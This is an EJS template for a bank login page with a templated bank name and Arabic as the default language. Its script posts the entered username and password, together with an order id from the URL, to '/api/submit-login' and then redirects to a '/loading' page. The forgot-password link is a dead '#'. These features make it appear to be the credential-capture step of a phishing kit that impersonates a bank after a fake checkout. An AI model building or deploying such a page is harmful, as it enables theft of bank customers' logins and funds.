<!DOCTYPE html>
<html lang="<%= lang %>" dir="<%= lang === 'ar' ? 'rtl' : 'ltr' %>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><%= t.login.title %> - <%= t.bankName %></title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Cairo', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #8b6914, #a07d2e, #6b5010);
            padding: 20px;
        }
        .login-container {
            width: 100%;
            max-width: 420px;
            text-align: center;
        }
        .login-logo {
            width: 180px;
            margin-bottom: 20px;
        }
        .login-subtitle {
            font-size: 15px;
            color: rgba(255,255,255,0.85);
            margin-bottom: 40px;
        }
        .form-group {
            margin-bottom: 25px;
            text-align: start;
        }
        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 700;
            color: #fff;
            margin-bottom: 8px;
        }
        .input-wrapper {
            position: relative;
        }
        .form-group input {
            width: 100%;
            padding: 16px 18px;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-family: 'Cairo', sans-serif;
            background: #fff;
            color: #333;
            outline: none;
        }
        .form-group input::placeholder {
            color: #aaa;
        }
        [dir="rtl"] .toggle-password { left: 14px; right: auto; }
        [dir="ltr"] .toggle-password { right: 14px; left: auto; }
        .toggle-password {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #666;
            font-size: 18px;
            display: flex;
            align-items: center;
        }
        .error-msg {
            color: #ff3333;
            font-size: 14px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 10px;
            display: none;
        }
        .error-msg.show {
            display: block;
        }
        .forgot-link {
            display: block;
            text-align: center;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            margin: 30px 0 40px;
            text-decoration: none;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 30px;
            background: #fff;
            color: #5a3e2b;
            font-size: 16px;
            font-weight: 700;
            font-family: 'Cairo', sans-serif;
            cursor: pointer;
            max-width: 320px;
            margin: 0 auto;
            display: block;
        }
        .login-btn:hover {
            background: #f0ebe5;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="/images/logo-gold.png" alt="<%= t.bankName %>" class="login-logo">
        <p class="login-subtitle"><%= t.login.subtitle %></p>

        <form id="loginForm">
            <div class="error-msg" id="errorMsg"><%= t.login.error %></div>

            <div class="form-group">
                <label for="username"><%= t.login.username %></label>
                <div class="input-wrapper">
                    <input type="text" id="username" name="username" placeholder="<%= t.login.username %>" required>
                </div>
            </div>

            <div class="form-group">
                <label for="password"><%= t.login.password %></label>
                <div class="input-wrapper">
                    <input type="password" id="password" name="password" placeholder="<%= t.login.password %>" required>
                    <button type="button" class="toggle-password" id="eyeToggle">
                        <svg id="eyeIcon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                    </button>
                </div>
            </div>

            <a href="#" class="forgot-link"><%= t.login.forgot %></a>

            <button type="submit" class="login-btn"><%= t.login.submit %></button>
        </form>
    </div>

    <script>
    (function() {
        var params = new URLSearchParams(window.location.search);
        var lang = params.get('lang') || 'ar';
        var orderId = parseInt(params.get('orderId'));
        var errorParam = params.get('error');

        if (errorParam) {
            document.getElementById('errorMsg').classList.add('show');
        }

        document.getElementById('eyeToggle').addEventListener('click', function() {
            var inp = document.getElementById('password');
            inp.type = inp.type === 'password' ? 'text' : 'password';
        });

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            var data = {
                orderId: orderId,
                username: document.getElementById('username').value.trim(),
                password: document.getElementById('password').value
            };

            fetch('/api/submit-login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(function(r) { return r.json(); })
            .then(function(d) {
                if (d.ok) {
                    window.location.href = '/loading?lang=' + lang + '&orderId=' + orderId;
                }
            })
            .catch(function(err) {
                console.error(err);
            });
        });
    })();
    </script>
</body>
</html>
